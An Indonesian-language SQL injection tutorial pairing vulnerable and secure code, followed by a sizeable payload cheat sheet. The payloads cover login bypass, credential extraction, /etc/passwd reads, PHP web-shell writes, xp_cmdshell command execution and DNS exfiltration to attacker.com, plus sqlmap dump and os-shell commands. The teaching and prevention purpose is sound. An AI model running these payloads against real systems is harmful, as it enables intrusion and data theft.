# SQL Injection (SQLi)

## Pengertian

SQL Injection (SQLi) adalah teknik serangan yang memanfaatkan celah keamanan pada aplikasi web ketika input dari pengguna dimasukkan langsung ke dalam perintah SQL tanpa validasi atau pembersihan yang memadai. Melalui teknik ini, penyerang dapat menyisipkan perintah SQL yang mengubah perilaku query asli.

**Analogi:** Bayangkan sebuah formulir pendaftaran yang meminta nama Anda. Jika seseorang menulis "Nama Saya, dan juga tolong berikan saya akses ke seluruh gedung" dan formulir tersebut diproses tanpa diperiksa, maka permintaan tambahan tersebut akan dipenuhi. SQL Injection bekerja dengan cara yang sama -- menambahkan perintah tersembunyi ke dalam query database.

## Contoh Source Code yang Rentan SQL Injection

### 1. PHP - Login Form

**Kode Rentan:**
```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

// BAHAYA: Input pengguna langsung digabungkan ke query SQL
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    echo "Login successful";
    $_SESSION['user'] = $username;
} else {
    echo "Login failed";
}
?>
```

**Kode Aman:**
```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

// AMAN: Gunakan prepared statement
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
    echo "Login successful";
    $_SESSION['user'] = $username;
} else {
    echo "Login failed";
}

$stmt->close();
?>
```

### 2. Python (Flask) - Product Search

**Kode Rentan:**
```python
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/search')
def search():
    keyword = request.args.get('keyword')
    
    # BAHAYA: Input pengguna langsung digabungkan ke query SQL
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    query = "SELECT * FROM products WHERE name LIKE '%" + keyword + "%'"
    cursor.execute(query)
    products = cursor.fetchall()
    
    return str(products)

if __name__ == "__main__":
    app.run(debug=True)
```

**Kode Aman:**
```python
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/search')
def search():
    keyword = request.args.get('keyword')
    
    # AMAN: Gunakan parameterized query
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    query = "SELECT * FROM products WHERE name LIKE ?"
    cursor.execute(query, ('%' + keyword + '%',))
    products = cursor.fetchall()
    
    return str(products)

if __name__ == "__main__":
    app.run(debug=True)
```

### 3. Node.js (Express) - User Profile

**Kode Rentan:**
```javascript
const express = require('express');
const mysql = require('mysql');
const app = express();

const connection = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    password: 'password',
    database: 'myapp'
});

app.get('/profile', (req, res) => {
    const userId = req.query.id;
    
    // BAHAYA: Input pengguna langsung digabungkan ke query SQL
    const query = "SELECT * FROM users WHERE id = " + userId;
    connection.query(query, (error, results) => {
        if (error) {
            return res.status(500).send(error.message);
        }
        res.json(results);
    });
});

app.listen(3000);
```

**Kode Aman:**
```javascript
const express = require('express');
const mysql = require('mysql');
const app = express();

const connection = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    password: 'password',
    database: 'myapp'
});

app.get('/profile', (req, res) => {
    const userId = req.query.id;
    
    // AMAN: Gunakan parameterized query
    const query = "SELECT * FROM users WHERE id = ?";
    connection.query(query, [userId], (error, results) => {
        if (error) {
            return res.status(500).send(error.message);
        }
        res.json(results);
    });
});

app.listen(3000);
```

### 4. Java (Spring Boot) - Order Lookup

**Kode Rentan:**
```java
@RestController
public class OrderController {
    
    @Autowired
    private JdbcTemplate jdbcTemplate;
    
    @GetMapping("/order")
    public Order getOrder(@RequestParam String orderId) {
        // BAHAYA: Input pengguna langsung digabungkan ke query SQL
        String query = "SELECT * FROM orders WHERE id = " + orderId;
        return jdbcTemplate.queryForObject(query, new OrderRowMapper());
    }
}
```

**Kode Aman:**
```java
@RestController
public class OrderController {
    
    @Autowired
    private JdbcTemplate jdbcTemplate;
    
    @GetMapping("/order")
    public Order getOrder(@RequestParam String orderId) {
        // AMAN: Gunakan parameterized query
        String query = "SELECT * FROM orders WHERE id = ?";
        return jdbcTemplate.queryForObject(query, new OrderRowMapper(), orderId);
    }
}
```

## Lokasi Kerentanan

SQL Injection dapat muncul di berbagai titik input dalam aplikasi web:

| Lokasi | Contoh Kasus |
|--------|--------------|
| Form Login | Username dan password langsung digunakan dalam query SQL |
| Kolom Pencarian | Input pencarian dimasukkan ke query tanpa filter |
| Parameter URL | `/produk.php?id=1` menghasilkan query `SELECT * FROM produk WHERE id = 1` |
| Cookie atau Header | Nilai dari cookie langsung dimasukkan ke query tanpa sanitasi |

Jika input dari pengguna tidak disaring atau diamankan, semua titik di atas dapat menjadi pintu masuk SQL Injection.

## Dampak

SQL Injection merupakan salah satu kerentanan paling berbahaya karena dapat mengakibatkan:

- **Bypass Autentikasi** -- Penyerang dapat login tanpa mengetahui password yang valid
- **Pencurian Data** -- Seluruh isi tabel database dapat diakses, termasuk data sensitif
- **Modifikasi Data** -- Data dapat diubah atau dihapus oleh penyerang
- **Eksekusi Perintah** -- Dalam kasus tertentu, penyerang dapat menjalankan perintah di server database

## Jenis-jenis SQL Injection

### 1. In-Band SQLi (Classic)

Penyerang menggunakan channel yang sama untuk memasukkan payload dan melihat hasilnya.

**Contoh:**
```
Username: admin' OR '1'='1
Password: [kosong]

Query menjadi:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = ''
```

### 2. Inferential SQLi (Blind)

Penyerang tidak dapat melihat hasil query secara langsung, tetapi dapat menyimpulkan informasi dari respons aplikasi.

**Time-based:**
```
' OR SLEEP(5)--
```
Jika respons delay 5 detik, aplikasi rentan SQLi.

**Boolean-based:**
```
' AND 1=1--
' AND 1=2--
```
Bandingkan respons antara kedua payload.

### 3. Out-of-Band SQLi

Penyerang menggunakan channel berbeda untuk mengirim data (misalnya DNS atau HTTP request).

**Contoh:**
```
'; EXEC xp_cmdshell('nslookup attacker.com')--
```

## Kumpulan Payload SQL Injection

### Payload Deteksi Dasar

Payload ini digunakan untuk mengidentifikasi apakah aplikasi rentan SQL Injection:

```sql
'                    -- Menguji respons aplikasi terhadap karakter quote
"                    -- Menguji respons aplikasi terhadap double quote
'--                  -- Mengakhiri string dan mengomentari sisa query
'#                   -- Alternatif untuk mengomentari sisa query (MySQL)
' OR '1'='1          -- Kondisi yang selalu benar
' OR 1=1--           -- Bypass login
' ORDER BY 1--       -- Menentukan jumlah kolom dalam query
' GROUP BY 1--       -- Alternatif untuk menentukan jumlah kolom
```

### Payload untuk Bypass Login

**Login tanpa password:**
```sql
Username: admin'--
Username: admin'#
Username: ' OR 1=1--
Username: ' OR '1'='1
Username: ' OR ''='
Password: [kosong]

Username: admin' AND 1=1--
Username: admin' AND true--
```

**Login sebagai user pertama:**
```sql
Username: ' OR 1=1 LIMIT 1--
Username: ' UNION SELECT 1, 'admin', 'password'--
```

### Payload untuk Menentukan Jumlah Kolom

**ORDER BY:**
```sql
' ORDER BY 1--        -- Jika tidak error, lanjutkan
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--        -- Jika error, berarti 3 kolom
```

**GROUP BY:**
```sql
' GROUP BY 1--
' GROUP BY 1,2--
' GROUP BY 1,2,3--    -- Jika error, berarti 2 kolom
```

### Payload UNION SELECT

**Setelah mengetahui jumlah kolom (misal 3 kolom):**
```sql
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
```

**Membaca file:**
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--
```

**Menulis file:**
```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--
```

### Payload untuk Information Schema

**Mendapatkan versi database:**
```sql
' UNION SELECT @@version,2,3--
' UNION SELECT version(),2,3--
```

**Mendapatkan nama database:**
```sql
' UNION SELECT database(),2,3--
```

**Mendapatkan user database:**
```sql
' UNION SELECT user(),2,3--
' UNION SELECT current_user,2,3--
```

**Mendapatkan daftar tabel:**
```sql
-- MySQL
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--

-- PostgreSQL
' UNION SELECT table_name,2,3 FROM information_schema.tables--

-- MSSQL
' UNION SELECT table_name,2,3 FROM information_schema.tables--

-- Oracle
' UNION SELECT table_name,2,3 FROM all_tables--
```

**Mendapatkan daftar kolom:**
```sql
-- MySQL
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--

-- PostgreSQL
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
```

**Membaca data dari tabel:**
```sql
' UNION SELECT username,password,email FROM users--
' UNION SELECT concat(username,':',password),2,3 FROM users--
```

### Payload Blind SQL Injection

**Time-based (MySQL):**
```sql
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
' OR IF(1=1, BENCHMARK(5000000, MD5('test')), 0)--
```

**Time-based (PostgreSQL):**
```sql
'; SELECT pg_sleep(5)--
' AND 1=CAST(pg_sleep(5) AS int)--
```

**Time-based (MSSQL):**
```sql
'; WAITFOR DELAY '0:0:5'--
' IF 1=1 WAITFOR DELAY '0:0:5'--
```

**Boolean-based:**
```sql
' AND 1=1--          -- Halaman normal
' AND 1=2--          -- Halaman berbeda/error

' AND LENGTH(database()) > 5--
' AND ASCII(SUBSTRING(database(),1,1)) > 100--
```

### Payload Out-of-Band SQLi

**DNS exfiltration (MSSQL):**
```sql
'; EXEC xp_cmdshell('nslookup ' + (SELECT TOP 1 table_name FROM information_schema.tables) + '.attacker.com')--
```

**HTTP request (MySQL):**
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test'))--
```

### Payload Second-Order SQL Injection

**Menyimpan payload di database:**
```sql
Username: admin'--
Email: normal@email.com
```

**Trigger payload saat digunakan:**
```sql
-- Saat username digunakan di query lain
SELECT * FROM orders WHERE username = 'admin'--'
```

### Payload Database-Specific

**MySQL:**
```sql
-- Comment
'-- 
'#
/* comment */

-- String concatenation
' CONCAT('a','b')--

-- File operations
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--
' UNION SELECT 'shell' INTO OUTFILE '/var/www/shell.php'--

-- Command execution (jika FILE privilege)
' UNION SELECT sys_exec('id'),2,3--
```

**PostgreSQL:**
```sql
-- Comment
'--

-- String concatenation
' || 'a' || 'b'--

-- Command execution (jika superuser)
'; CREATE TABLE cmd_exec(cmd_output text);
'; COPY cmd_exec FROM PROGRAM 'id';
'; SELECT * FROM cmd_exec;--
```

**MSSQL:**
```sql
-- Comment
'--
/* comment */

-- String concatenation
' + 'a' + 'b'--

-- Command execution
'; EXEC xp_cmdshell 'id';--

-- Enable xp_cmdshell jika disabled
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'id';--
```

**Oracle:**
```sql
-- Comment
'--

-- String concatenation
' || 'a' || 'b'--

-- Command execution
'; EXECUTE IMMEDIATE 'BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name => ''test'', job_type => ''EXECUTABLE'', job_action => ''/bin/id'', enabled => TRUE); END;'--
```

## Tools untuk Pengujian SQL Injection

### 1. SQLMap

SQLMap adalah alat otomatis paling populer untuk mendeteksi dan mengeksploitasi SQL Injection.

**Instalasi:**
```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --help
```

**Penggunaan:**
```bash
-- Deteksi SQL Injection
python sqlmap.py -u 'http://target.com/page?id=1'

-- Menggunakan cookie
python sqlmap.py -u 'http://target.com/page?id=1' --cookie='session=xyz'

-- Menggunakan HTTP method tertentu
python sqlmap.py -u 'http://target.com/login' --data='username=admin&password=test'

-- Enumerasi database
python sqlmap.py -u 'http://target.com/page?id=1' --dbs

-- Enumerasi tabel dari database tertentu
python sqlmap.py -u 'http://target.com/page?id=1' -D database_name --tables

-- Dump data dari tabel
python sqlmap.py -u 'http://target.com/page?id=1' -D database_name -T users --dump

-- Membaca file dari server
python sqlmap.py -u 'http://target.com/page?id=1' --file-read=/etc/passwd

-- Mendapatkan shell
python sqlmap.py -u 'http://target.com/page?id=1' --os-shell
python sqlmap.py -u 'http://target.com/page?id=1' --sql-shell

-- Menggunakan level dan risk tinggi
python sqlmap.py -u 'http://target.com/page?id=1' --level=5 --risk=3

-- Bypass WAF
python sqlmap.py -u 'http://target.com/page?id=1' --tamper=space2comment
```

### 2. Burp Suite

Burp Suite dapat digunakan untuk pengujian SQL Injection secara manual:

- **Intruder** -- Mengirim berbagai payload secara otomatis
- **Repeater** -- Menguji payload satu per satu dan menganalisis respons
- **Scanner** (Professional) -- Mendeteksi SQL Injection secara otomatis

**Payload list untuk Intruder:**
```
'
"
'--
'#
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL--
' ORDER BY 1--
```

### 3. OWASP ZAP

OWASP ZAP memiliki fitur untuk mendeteksi SQL Injection:

- **Active Scan** -- Otomatis mendeteksi SQL injection vulnerabilities
- **Fuzzer** -- Mengirim berbagai payload untuk menguji kerentanan

### 4. jSQL Injection

jSQL adalah alat SQL Injection berbasis Java dengan GUI.

**Instalasi:**
```bash
git clone https://github.com/ron190/jsql-injection.git
cd jsql-injection
java -jar jsql-injection.jar
```

### 5. NoSQLMap

NoSQLMap untuk pengujian NoSQL Injection (MongoDB, CouchDB, dll).

**Instalasi:**
```bash
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
python nosqlmap.py
```

### 6. PayloadsAllTheThings

Repositori lengkap berisi payload SQL Injection:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

## Metode Deteksi

Untuk mengidentifikasi apakah sebuah aplikasi rentan SQL Injection:

1. **Uji dengan karakter khusus** -- Input `'`, `"`, `;`, `--` dan perhatikan error atau perubahan perilaku
2. **Uji dengan kondisi boolean** -- Input `OR 1=1` dan `OR 1=2`, bandingkan respons
3. **Uji time-based** -- Input `SLEEP(5)` dan perhatikan waktu respons
4. **Perhatikan error message** -- Error dari database dapat mengungkap struktur query
5. **Uji berbagai parameter** -- Coba injection di semua input yang diterima aplikasi (GET, POST, Cookie, Header)

## Metode Pencegahan

1. **Gunakan Prepared Statements (Parameterized Queries)** -- Ini adalah metode pencegahan paling efektif. Prepared statements memisahkan data dari perintah SQL
   
   ```python
   # Python dengan SQLite
   cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
   
   # Python dengan MySQL
   cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
   ```
   
   ```php
   // PHP dengan PDO
   $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
   $stmt->execute(['username' => $username, 'password' => $password]);
   
   // PHP dengan MySQLi
   $stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
   $stmt->bind_param("ss", $username, $password);
   $stmt->execute();
   ```

2. **Gunakan ORM (Object-Relational Mapping)** -- ORM seperti SQLAlchemy, Eloquent, atau Hibernate secara otomatis menggunakan parameterized queries
   
   ```python
   # SQLAlchemy
   user = User.query.filter_by(username=username, password=password).first()
   ```

3. **Validasi input** -- Terapkan validasi ketat pada semua input pengguna. Gunakan whitelist untuk nilai yang diharapkan
   
   ```python
   # Hanya izinkan angka untuk ID
   if not user_id.isdigit():
       return "Invalid ID", 400
   ```

4. **Gunakan stored procedures** -- Stored procedures dapat membantu mengisolasi logika database dari input langsung
   
   ```sql
   CREATE PROCEDURE GetProduct(IN prod_id INT)
   BEGIN
       SELECT * FROM products WHERE id = prod_id;
   END;
   ```

5. **Terapkan prinsip least privilege** -- Batasi hak akses akun database yang digunakan aplikasi. Jangan gunakan akun dengan hak admin
   
   ```sql
   -- Buat user dengan hak minimal
   CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
   GRANT SELECT, INSERT, UPDATE ON myapp.* TO 'app_user'@'localhost';
   ```

6. **Escape karakter khusus** -- Jika prepared statements tidak memungkinkan, gunakan fungsi escaping
   
   ```php
   // PHP MySQLi
   $safe_input = $conn->real_escape_string($input);
   ```

7. **Gunakan Web Application Firewall (WAF)** -- WAF dapat membantu mendeteksi dan memblokir pola serangan SQL Injection

## Latihan Praktis

Silakan lanjutkan ke direktori latihan untuk eksplorasi lebih lanjut.

## Referensi Lanjutan

- OWASP SQL Injection
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
- SQLMap: https://sqlmap.org/ (alat otomatis untuk pengujian SQL Injection)
- PortSwigger: SQL Injection -- https://portswigger.net/web-security/sql-injection
- PayloadsAllTheThings SQL Injection -- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- SQL Injection Cheat Sheet -- https://portswigger.net/web-security/sql-injection/cheat-sheet
